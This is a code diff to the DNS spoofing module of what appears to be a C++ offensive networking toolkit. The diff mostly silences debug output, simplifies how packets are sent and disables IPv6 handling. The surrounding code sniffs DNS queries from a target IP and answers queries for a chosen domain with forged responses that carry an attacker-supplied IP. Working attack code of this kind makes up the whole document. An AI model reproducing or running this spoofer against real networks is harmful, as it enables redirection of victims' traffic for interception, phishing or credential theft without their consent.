@@ -40,18 +40,15 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                 IPv4Header* ipv4Header = (IPv4Header*)packet.GetLayerStart(1);
                 if(targetIPAddr.sin_addr.s_addr == ipv4Header->ip_src.s_addr)
                 {
-                    std::cout << "parsing dns request...\n";
                     dnsParser.ParseToHostFormat(*dnsHeader);
-                    std::cout << "dns request parsed:\n";
-
-                    dnsParser.PrintQueries();
+                    // dnsParser.PrintQueries();
 
                     for(unsigned int i = 0; i < dnsParser.header.qcount; ++i)
                     {
                         if((PacketCraft::FindInStr(dnsParser.questionsArray[i].qName, domain) != -1) && dnsParser.questionsArray[i].qType == 1)
                         {
-                            std::cout << "dns request matching domain name received: \n";
-                            packet.Print();
+                            // std::cout << "dns request matching domain name received: \n";
+                            // packet.Print();
 
                             PacketCraft::Packet dnsResponse;
                             CreateFakeDNSResponse(packet, dnsResponse, fakeDomainIP, IPVersion::IPV4, dnsParser.questionsArray[i]);
@@ -64,16 +61,8 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
                                 LOG_ERROR(APPLICATION_ERROR, "if_nametoindex() error!");
                                 return APPLICATION_ERROR;
                             }
-                    
-                            sockaddr_ll sockAddr{};
-                            sockAddr.sll_family = PF_PACKET;
-                            sockAddr.sll_protocol = htons(ETH_P_IP);
-                            sockAddr.sll_ifindex = ifIndex;
-                            sockAddr.sll_halen = ETH_ALEN;
-                            sockAddr.sll_hatype = htons(ARPHRD_ETHER);
-                            memcpy(sockAddr.sll_addr, ethHeader->ether_dhost, ETH_ALEN);
 
-                            if(dnsResponse.Send(socketFd, 0, (sockaddr*)&sockAddr, sizeof(sockAddr)) == APPLICATION_ERROR)
+                            if(dnsResponse.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
                             {
                                 LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error");
                                 return APPLICATION_ERROR;
@@ -84,14 +73,17 @@ int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targ
             }
             else if(ethHeader->ether_type == htons(ETH_P_IPV6)) // TODO: make sure ipv6 processing code below works
             {
+                LOG_ERROR(APPLICATION_ERROR, "IPv6 not supported!");
+                return APPLICATION_ERROR;
+
                 sockaddr_in6 targetIPAddr{};
                 inet_pton(AF_INET6, targetIP, &targetIPAddr.sin6_addr);
 
                 IPv6Header* ipv6Header = (IPv6Header*)packet.GetLayerStart(1);
                 if(memcmp(targetIPAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, 16) == 0)
                 {
-                    std::cout << "Matching IPv6 found in DNS packet\n";
-                    packet.Print();
+                    dnsParser.ParseToHostFormat(*dnsHeader);
+
                 }
             }
         }
@@ -105,7 +97,7 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPack
     dnsResponsePacket.AddLayer(PC_ETHER_II, ETH_HLEN);
     EthHeader* dnsResponseEthHeader = (EthHeader*)dnsResponsePacket.GetLayerStart(0);
     CreateEthHeader(*dnsResponseEthHeader, *dnsRequestEthHeader);
-    std::cout << "Eth header created\n";
+    // std::cout << "Eth header created\n";
     
     if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IP)
     {
@@ -113,7 +105,7 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPack
         dnsResponsePacket.AddLayer(PC_IPV4, sizeof(IPv4Header));
         IPv4Header* dnsResponseIPv4Header = (IPv4Header*)dnsResponsePacket.GetLayerStart(1);
         CreateIPv4Header(*dnsResponseIPv4Header, *dnsRequestIPv4Header);
-        std::cout << "IPV4 header created\n";
+        // std::cout << "IPV4 header created\n";
 
         if(dnsResponseIPv4Header->ip_p == IPPROTO_UDP)
         {
@@ -121,7 +113,7 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPack
             dnsResponsePacket.AddLayer(PC_UDP, sizeof(UDPHeader));
             UDPHeader* dnsResponseUDPHeader = (UDPHeader*)dnsResponsePacket.GetLayerStart(2);
             CreateUDPHeader(*dnsResponseUDPHeader, *dnsRequestUDPHeader);
-            std::cout << "UDP header created\n";
+            // std::cout << "UDP header created\n";
 
             // finally add DNS layer
             DNSHeader* dnsRequestDNSHeader = (DNSHeader*)dnsRequestPacket.FindLayerByType(PC_DNS);
@@ -148,9 +140,9 @@ int CHaks::DNSSpoofer::CreateFakeDNSResponse(PacketCraft::Packet& dnsRequestPack
             // std::cout << "dnsAnswerSize is " << dnsAnswerSize << "\n";
             
             dnsResponsePacket.AddLayer(PC_DNS, sizeof(DNSHeader) + dnsQuestionSize + dnsAnswerSize);
-            DNSHeader* dnsResponseDNSHeader = (DNSHeader*)dnsResponsePacket.GetLayerStart(3);
+            DNSHeader* dnsResponseDNSHeader = (DNSHeader*)dnsResponsePacket.GetLayerStart(3); // TODO: remove hardcoded 3
             CreateDNSHeader(*dnsResponseDNSHeader, *dnsRequestDNSHeader, question, fakeDomainIP, ipVersion);
-            std::cout << "DNS header created\n";
+            // std::cout << "DNS header created\n";
 
             dnsResponseIPv4Header->ip_len = htons(dnsResponsePacket.GetSizeInBytes() - sizeof(*dnsResponseEthHeader));
             dnsResponseIPv4Header->ip_sum = PacketCraft::CalculateChecksum(dnsResponseIPv4Header, sizeof(*dnsResponseIPv4Header));
